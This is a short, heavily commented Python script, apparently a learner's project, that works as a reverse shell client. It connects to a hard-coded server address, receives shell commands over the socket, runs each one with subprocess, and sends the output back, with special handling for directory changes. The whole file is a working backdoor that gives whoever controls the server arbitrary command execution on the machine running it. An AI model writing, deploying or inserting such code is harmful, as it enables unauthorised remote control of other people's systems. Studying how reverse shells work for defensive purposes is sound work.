import socket
import subprocess
import os

BUFFER_SIZE = 1024
SERVER_IP = "192.168.0.26"
SERVER_PORT = 8080

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER_IP, SERVER_PORT))
print(f"[+] connected to: {SERVER_IP} ~ {SERVER_PORT}")

current_dir = "/" # sets the current variable to the root directory, meaning the code will assume the current working directory is the root directory, even though we're not. it gets updated when we change directory

while True:
    try:
        cmd = client.recv(BUFFER_SIZE).decode()
        print(cmd)
        if not cmd.strip(): # checks if the cmd variable is empty or only has white spaces. if so, the continue statement skips. avoids processing white space only commands
            continue

        if cmd.startswith("cd"): # if the command recieved starts with cd it means the directory is about to be changed
            new_dir = cmd.split(" ")[1] # extracts the new directory path from the cmd variable, the split() method splits the string into a list of words based on whitespace characters. the 1 extracts the second word(directory)
            try:
                os.chdir(new_dir) # just change to the directory specified with the command receieved using os
                current_dir = os.getcwd()
                client.send(f"Changed Directory to: {current_dir}".encode())
                print(f"Changed Directory to: {current_dir}")
            except Exception as e:
                client.send(f"Error: {e}".encode())
        else:
            output = subprocess.getoutput(cmd)
            client.send(output.encode())

    except Exception as e:
        print(f"Error: {e}")
        break
